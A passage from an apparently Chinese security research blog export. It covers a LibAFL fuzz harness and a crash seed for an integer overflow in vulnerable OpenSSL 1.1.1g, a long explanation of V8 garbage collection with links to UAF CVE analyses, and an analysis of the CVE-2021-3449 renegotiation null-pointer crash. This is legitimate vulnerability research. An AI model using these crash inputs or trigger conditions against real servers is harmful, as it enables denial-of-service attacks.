class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* input_file = getenv(<span class="string">&quot;FUZZ_INPUT_FILE&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (input_file) &#123;</span><br><span class="line">        FILE *fp = fopen(input_file, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">        <span class="type">long</span> filesize = ftell(fp);</span><br><span class="line">        fseek(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">        <span class="keyword">if</span> (filesize &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            fclose(fp);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint8_t</span> *buf = <span class="built_in">malloc</span>(filesize);</span><br><span class="line">        <span class="keyword">if</span> (!buf) &#123;</span><br><span class="line">            fclose(fp);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fread(buf, <span class="number">1</span>, filesize, fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        LLVMFuzzerTestOneInput(buf, filesize);</span><br><span class="line">        <span class="built_in">free</span>(buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_LIBAFL</span></span><br><span class="line">    <span class="comment">// LibAFL 模式</span></span><br><span class="line">    __AFL_INIT();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf = __AFL_FUZZ_TESTCASE_BUF;</span><br><span class="line">    <span class="type">size_t</span> len = __AFL_FUZZ_TESTCASE_LEN;</span><br><span class="line">    LLVMFuzzerTestOneInput(buf, len);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">// 标准模式</span></span><br><span class="line">    <span class="type">uint8_t</span> buffer[<span class="number">65536</span>];</span><br><span class="line">    <span class="type">ssize_t</span> result = read(STDIN_FILENO, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="keyword">if</span> (result &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        LLVMFuzzerTestOneInput(buffer, result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">uint8_t</span> test_data[] = &#123;<span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>&#125;;</span><br><span class="line">        LLVMFuzzerTestOneInput(test_data, <span class="keyword">sizeof</span>(test_data));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造种子以及编译harness命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">构造crash种子</span></span><br><span class="line">echo -e -n &quot;\\xfe\\xff\\xff\\x7f&quot; &gt; huge_seeds</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">compile harness with libafl_cc</span></span><br><span class="line">&quot;$&#123;PROJECT_ROOT&#125;/target/release/libafl_cc&quot; \</span><br><span class="line">  -DUSE_LIBAFL \</span><br><span class="line">  -fsanitize=address -fsanitize=undefined -fno-sanitize-recover=undefined \</span><br><span class="line">  -I&quot;$&#123;PROJECT_ROOT&#125;/source_tests/vulnerable_openssl/openssl-1.1.1g/include&quot; \</span><br><span class="line">  &quot;$&#123;SCRIPT_DIR&#125;/harness.c&quot; \</span><br><span class="line">  -L&quot;$&#123;PROJECT_ROOT&#125;/source_tests/vulnerable_openssl/openssl-1.1.1g&quot; \</span><br><span class="line">  -lssl -lcrypto \</span><br><span class="line">  -o &quot;$&#123;SCRIPT_DIR&#125;/harness_libafl&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">start fuzz</span></span><br><span class="line">&quot;$&#123;PROJECT_ROOT&#125;/target/release/fuzzer-palo&quot; fuzz-libsource --in &quot;$&#123;SCRIPT_DIR&#125;/seeds&quot; --out &quot;$&#123;SCRIPT_DIR&#125;/outs&quot; &quot;$&#123;SCRIPT_DIR&#125;/harness_libafl&quot;</span><br></pre></td></tr></table></figure>

<p>成功触发整数溢出：</p>
<img src="/posts/4fd5388e/e3b7cae1fa08801c0a7bb51ecd9ef768.png" class="" title="e3b7cae1fa08801c0a7bb51ecd9ef768">



<p>但是fuzz时跑不出结果，因为需要申请超大内存，需要增大超时时间，保证目标程序跑完一轮后再退出。</p>
<img src="/posts/4fd5388e/image-20250718115725330.png" class="" title="image-20250718115725330">

]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>V8内存回收机制</title>
    <url>/posts/f020ea55.html</url>
    <content><![CDATA[<h2 id="V8内存回收机制"><a href="#V8内存回收机制" class="headerlink" title="V8内存回收机制"></a>V8内存回收机制</h2><h3 id="V8-采用的垃圾回收算法（2019年）"><a href="#V8-采用的垃圾回收算法（2019年）" class="headerlink" title="V8 采用的垃圾回收算法（2019年）"></a>V8 采用的垃圾回收算法（2019年）</h3><p><strong>内存回收机制的基本组成部分</strong></p>
<ol>
<li>识别存活&#x2F;已死亡对象</li>
<li>回收死亡对象的内存</li>
<li>整合分片化内存（可选）</li>
</ol>
<p>v8垃圾回收机制分为<strong>Major GC</strong>和<strong>Minor GC</strong>两种内存回收器</p>
<ul>
<li>Major GC：Mark Compact（针对整个堆空间）</li>
<li>Minor GC：<strong>Scavenge</strong> &amp; Minor Mark Sweep（针对新生代）</li>
</ul>
<h4 id="Major-GC-Full-Mark-Compact"><a href="#Major-GC-Full-Mark-Compact" class="headerlink" title="Major GC (Full Mark-Compact)"></a>Major GC (Full Mark-Compact)</h4><p>major gc负责从整个堆内存中回收垃圾内存。</p>
<img src="/posts/f020ea55/image-20250716132400706.png" class="" title="image-20250716132400706">

<p>上图为最简单的版本，将Major GC 分为三个阶段: marking, sweeping和compacting，存在很大的延迟，影响性能。</p>
<h5 id="Marking"><a href="#Marking" class="headerlink" title="Marking"></a>Marking</h5><p>通过可达性判断对象是否存活（可达：当前运行状态可引用的对象；不可达：其他所有不被引用对象）<br>首先从已知对象指针根集合（执行栈、全局对象）开始查找指针对应对象并将其标记为可达，然后递归遍历。<br>V8使用三色标记法来标记对象，每个对象通过两个标记位和一个标记列表来实现标记，两个标记为标识三种颜色：白色（00）、灰色（10）和黑色（11）。最初所有对象都是白色，当垃圾回收器发现白色物体并将其推送到标记列表时，它会变成灰色。当收集器从标记工作列表弹出对象并访问其所有字段时，灰色对象变为黑色。当不再有灰色对象时，标记完成，所有剩余白色物体都无法到达，可以安全地回收。</p>
<h6 id="三色标记法"><a href="#三色标记法" class="headerlink" title="三色标记法"></a>三色标记法</h6><ul>
<li>黑色表示正在使用的对象，不能回收</li>
<li>灰色表示通过黑色对象可以被访问的对象，需要加入worklist；在worklist的对象会在下一次迭代中标记为黑色</li>
<li>白色表示在当前状态下，不能被访问到的对象<br>GC算法标记结束后，白色对象将被释放。当前漏洞成因是一个能够被访问到的对象在GC算法结束时，被错误地标记为白色，导致被释放，出现UAF。</li>
</ul>
<h5 id="Sweeping"><a href="#Sweeping" class="headerlink" title="Sweeping"></a>Sweeping</h5><p>将死亡对象（不可达对象）添加到free-lists。每一段内存区域对应一个free-list，方便后续查找死亡对象进行释放以及重新申请内存。</p>
<h5 id="Compaction"><a href="#Compaction" class="headerlink" title="Compaction"></a>Compaction</h5><p>major gc在此阶段根据该内存页的分片情况选择是否进行Compact。<br>Compact策略是将分片比较严重的内存页中的存活对象复制到其他内存页，从而保证该内存页仅剩死亡对象，方便后续的内存回收。<br>弊端：需要复制大量的存活对象，因此仅当内存页分片比较严重时才会这样做。其他情况则仅做sweeping操作。</p>
<a href="/posts/f020ea55.html" title="V8内存回收机制">Major GC源码分析</a>
<h4 id="Minor-GC-Scavenger"><a href="#Minor-GC-Scavenger" class="headerlink" title="Minor GC (Scavenger)"></a>Minor GC (Scavenger)</h4><h5 id="Generational-layout"><a href="#Generational-layout" class="headerlink" title="Generational layout"></a>Generational layout</h5><p>V8中的堆内存被分为不同的区域，称为“generations”。分为新生代（young generation，分为nursery和intermediate）和老生代（old generation）。<br>初始申请对象的堆内存时，将其申请在nursery空间。如果在下一次GC后，该对象仍然标记为存活，则将其<strong>移动</strong>到intermediate区域。如果再一次GC后，该对象仍然存活，则将其<strong>移动</strong>到老生代区域。（基于大部分申请对象的存活周期都比较短的现象）。</p>

<h5 id="Cheney’s-Semispace-Copy"><a href="#Cheney’s-Semispace-Copy" class="headerlink" title="Cheney’s Semispace Copy"></a>Cheney’s Semispace Copy</h5><p>分为三步（Marking，Evacuating，Pointer-updating）<br>每次gc后存活对象会被迁移到新的内存页。使用”semi-space”设计，一半为全空（<strong>To-Space，intermediate</strong>），另一半为Nursery区域（<strong>From-Space</strong>）。<br>在scavenge过程中，需要额外维护一个根集合（<strong>Old-to-young generation references：老生代的指针引用新生代的对象</strong>）。使用remebered set、write-barriers来维护该集合。</p>
<blockquote>
<p>When combined with the stack and globals, we know every reference into the young generation, without the need to trace through the entire old generation.</p>
</blockquote>


<p><strong>Marking</strong>：以调用栈以及old-to-young generation reference作为根集合开始递归搜索并移动。<br><strong>Evacuation</strong>：将所有存活对象移动到一段连续内存，可以解决内存分片的问题。然后将两个空间翻转重新开始下一轮gc。</p>

<p>两轮都存活则移动到old-space。<br><strong>Pointer-Updating：</strong> 最后更新指向移动过的对象的指针。每一个拷贝的对象都会遗留一个forwarding-address来更新原指针指向新地址。</p>
<a href="/posts/f020ea55.html" title="V8内存回收机制">Minor GC源码分析</a>
<h5 id="Write-barriers"><a href="#Write-barriers" class="headerlink" title="Write-barriers"></a>Write-barriers</h5>
<p>具体见[[2025-07-25-Write Barrier.md|Write-barriers]]</p>
<h5 id="parallel-Mark-Evacuate（Since-V6-2）"><a href="#parallel-Mark-Evacuate（Since-V6-2）" class="headerlink" title="parallel Mark-Evacuate（Since V6.2）"></a>parallel Mark-Evacuate（Since V6.2）</h5><p>基于Major GC的Mark-Sweep-Compact垃圾回收器实现。分为三步（Marking， Copying，Updating pointers）<br>没有使用sweep机制，仍然使用semispace机制来保证compact特性。<br>分为多个线程，分别负责一段内存区域；每一个阶段完成进入下一阶段前需要进行线程间同步。</p>
<h5 id="parallel-Scavenge"><a href="#parallel-Scavenge" class="headerlink" title="parallel Scavenge"></a>parallel Scavenge</h5><p>将parallel Mark-Evacuate的三个阶段合并起来，每个内存页维护remembered set。对象并行处理，新发现的对象被添加到global work list用于gc线程处理。<strong>write barrier确保了当前处理对象不适合gc处理时，不会过早终止</strong><br>parallel Mark Evacuate与parallel Scavenge的区别见：[[2025-07-25-parallel Mark-Evaculate vs parallel Scavenge|Parallel Mark-Evaculate vs Parallel Scavenge]]</p>
<h4 id="Orinoco-Google-GC项目名称"><a href="#Orinoco-Google-GC项目名称" class="headerlink" title="Orinoco(Google GC项目名称)"></a>Orinoco(Google GC项目名称)</h4><p>介绍了一些gc里面的名词</p>
<h5 id="Parallel"><a href="#Parallel" class="headerlink" title="Parallel"></a>Parallel</h5><p>主线程与其他工作线程一起完成gc工作：</p>


<h5 id="Incremental"><a href="#Incremental" class="headerlink" title="Incremental"></a>Incremental</h5><p>分为多个小阶段</p>


<h5 id="Concurrent"><a href="#Concurrent" class="headerlink" title="Concurrent"></a>Concurrent</h5><p>交由工作线程处理，等结果返回后交付给主线程处理</p>


<h3 id="垃圾回收机制的创新，哪些时候引入的"><a href="#垃圾回收机制的创新，哪些时候引入的" class="headerlink" title="垃圾回收机制的创新，哪些时候引入的"></a>垃圾回收机制的创新，哪些时候引入的</h3><h5 id="Jank-Busters-Part-One（2015）"><a href="#Jank-Busters-Part-One（2015）" class="headerlink" title="Jank Busters Part One（2015）"></a>Jank Busters Part One（2015）</h5><p>原始版本：Chrome 41 -&gt; 46<br>优化前：</p>


<p>优化后：</p>


<h4 id="Jank-Busters-Part-Two（2016）"><a href="#Jank-Busters-Part-Two（2016）" class="headerlink" title="Jank Busters Part Two（2016）"></a>Jank Busters Part Two（2016）</h4><p><strong>优化1</strong>：实现 <a href="https://en.wikipedia.org/wiki/Garbage_collection_(computer_science)#Generational">generational garbage collector</a>parallel处理。<br>优化前：</p>

<p>优化后：</p>


<p><strong>优化2</strong>：更新了跟踪指针方式（rememberd set），改变指针方向，避免指针重复以及race。</p>




<p><strong>优化3</strong>：black allocation（Since V8 5.1），对垃圾回收的标记阶段的提升，所有位于old generations的对象都被标记为黑色，表示该对象为存活对象，对应三色标记法。</p>
<ul>
<li>可以直接申请到black page上；</li>
<li>无需sweep；</li>
<li>加速了incremental marking，因为通过black allocation的不会增加其工作量；</li>
</ul>
<h4 id="State-of-GC-in-V8"><a href="#State-of-GC-in-V8" class="headerlink" title="State of GC in V8"></a>State of GC in V8</h4><h5 id="Scavenging"><a href="#Scavenging" class="headerlink" title="Scavenging"></a>Scavenging</h5><p>parallel scavenging</p>


<h5 id="Major-GC"><a href="#Major-GC" class="headerlink" title="Major GC"></a>Major GC</h5><p>concurrent Marking，concurrent Sweeping &#x2F; parallel compaction + pointer updating</p>


<h5 id="Idle-time-GC"><a href="#Idle-time-GC" class="headerlink" title="Idle-time GC"></a>Idle-time GC</h5><p>空闲时间gc</p>


<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>源码位置在<code>//v8/src/heap/</code>目录下。<br>需要关注分析的文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">some basic utils</span></span><br><span class="line">heap.cc -&gt; heap definition</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">minor gc</span></span><br><span class="line">scavenger.cc -&gt; minor gc scavenger</span><br><span class="line">minor-mark-sweep.cc -&gt; minor gc mark sweep</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">major gc</span></span><br><span class="line">mark-compact.cc -&gt; major gc mark compact</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">some techniques</span></span><br><span class="line">evacuation-allocator.cc -&gt; minor gc evacuation</span><br><span class="line">incremental-marking.cc -&gt; incremental-marking</span><br></pre></td></tr></table></figure>

<p><code>GarbageCollector</code>类定义<code>//v8/src/heap/heap.cc</code></p>
<img src="/posts/f020ea55/image-20250715215021268.png" class="" title="image-20250715215021268">
<p>选择GarbageCollector函数<code>Heap::SelectGarbageCollector</code>，<code>//v8/src/heap/heap.cc</code></p>
<img src="/posts/f020ea55/image-20250715214723482.png" class="" title="image-20250715214723482">

<h4 id="Mark-Compact"><a href="#Mark-Compact" class="headerlink" title="Mark-Compact"></a>Mark-Compact</h4><p>CollectGarbage函数（<code>//v8/src/heap/mark-compact.cc</code>），包含基本流程：<br>![[2025-07-14-V8内存回收机制&#x2F;file-20250725163835844.png]]</p>
<ul>
<li>Mark相关函数，详见：<a href="/posts/null.html" title="Mark Compact: Mark功能解析">Mark Compact: Mark</a></li>
<li>Sweep相关函数，详见：<a href="/posts/null.html" title="Mark Compact Sweep">Mark Compact: Sweep</a></li>
<li>Evacuate相关函数，详见：<a href="/posts/null.html" title="Mark Compact: Evacuate">Mark Compact: Evacuate</a></li>
<li>Finish函数：收尾工作，将延迟释放的释放掉，以及释放申请的资源等。</li>
</ul>
<h4 id="Scavenger"><a href="#Scavenger" class="headerlink" title="Scavenger"></a>Scavenger</h4><p>CollectGarbage函数（<code>//v8/src/heap/scavenger.cc</code>），包含基本流程（swap semispace, iterate marking, promote, update）：<br>该函数详见：<a href="/posts/null.html" title="Scavenger CollectGarbage">Scavenger CollectGarbage</a></p>
<h4 id="Mark-Sweep"><a href="#Mark-Sweep" class="headerlink" title="Mark-Sweep"></a>Mark-Sweep</h4><p>CollectGarbage函数（<code>//v8/src/heap/minor-mark-sweep.cc</code>），包含基本流程：<br>![[2025-07-14-V8内存回收机制&#x2F;file-20250726143701519.png]]</p>
<ul>
<li>MarkLiveObjects函数：与Mark Compact的MarkLiveObject函数类似，但更关注于Young Generation对象。</li>
<li>Sweep函数：sweep+update</li>
</ul>
<h3 id="历史漏洞分析"><a href="#历史漏洞分析" class="headerlink" title="历史漏洞分析"></a>历史漏洞分析</h3><h4 id="Chrome-V8漏洞（CVE-2021-37975）分析"><a href="#Chrome-V8漏洞（CVE-2021-37975）分析" class="headerlink" title="Chrome V8漏洞（CVE-2021-37975）分析"></a>Chrome V8漏洞（CVE-2021-37975）分析</h4><p>详细分析见：<a href="/posts/null.html" title="CVE-2021-37975复现">CVE-2021-37075复现</a></p>
<h4 id="Chrome-V8漏洞（CVE-2022-1310）分析"><a href="#Chrome-V8漏洞（CVE-2022-1310）分析" class="headerlink" title="Chrome V8漏洞（CVE-2022-1310）分析"></a>Chrome V8漏洞（CVE-2022-1310）分析</h4><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul>
<li><a href="https://v8.dev/blog/trash-talk">Trash talk: the Orinoco garbage collector</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/688350947">[V8引擎]内存管理和垃圾回收(GC)</a></li>
<li><a href="https://v8.dev/blog/jank-busters">jank-busters</a></li>
<li><a href="https://v8.dev/blog/orinoco">orinoco</a></li>
<li><a href="https://v8.dev/blog/orinoco-parallel-scavenger">Orinoco: young generation garbage collection</a></li>
<li><a href="https://www.freebuf.com/vuls/339684.html">Chrome V8命令执行漏洞（CVE-2022-1310）分析</a></li>
<li><a href="https://bbs.kanxue.com/thread-281657.htm">[原创]chrome v8漏洞CVE-2021-37975浅析</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2021-3449漏洞原理分析与复现</title>
    <url>/posts/f34a8b40.html</url>
    <content><![CDATA[<h2 id="CVE-2021-3449空指针引用漏洞原理分析"><a href="#CVE-2021-3449空指针引用漏洞原理分析" class="headerlink" title="CVE-2021-3449空指针引用漏洞原理分析"></a>CVE-2021-3449空指针引用漏洞原理分析</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>该漏洞为公开漏洞，漏洞编号为CVE-2021-3449，漏洞类型为空指针引用漏洞，存在于OpenSSL的1.1.1-1.1.1j版本，包含11.1.4目标PA设备中的开源组件OpenSSL版本1.1.1g。官方描述信息如下：</p>
<img src="/posts/f34a8b40/image-20250725094337157.png" class="" title="image-20250725094337157">

<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>当TLS 1.2服务器在重新协商时，若客户端发送的ClientHello消息省略了初始握手存在的signature_algorithms扩展，但包含signature_algorithms_cert扩展，会触发空指针解引用，导致服务崩溃（拒绝服务攻击）。</p>
<p>发送恶意ClientHello请求后，在下图代码1732行tls1_lookup_sigalg函数位置发生空指针引用漏洞，其中由于signature_algorithms被省略，导致ptmp指针为空，出现空指针引用漏洞。</p>
<img src="/posts/f34a8b40/image-20250725094358924.png" class="" title="image-20250725094358924">

<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>当建立renegotiation信息时，存在空指针引用漏洞。验证漏洞POC报文如下：</p>
<img src="/posts/f34a8b40/image-20250725094415745.png" class="" title="image-20250725094415745">

<p>发送POC，测试程序ASAN检测到空指针引用错误，产生崩溃时的函数调用链如下图：</p>
<img src="/posts/f34a8b40/image-20250725094424353.png" class="" title="image-20250725094424353">]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
</search>
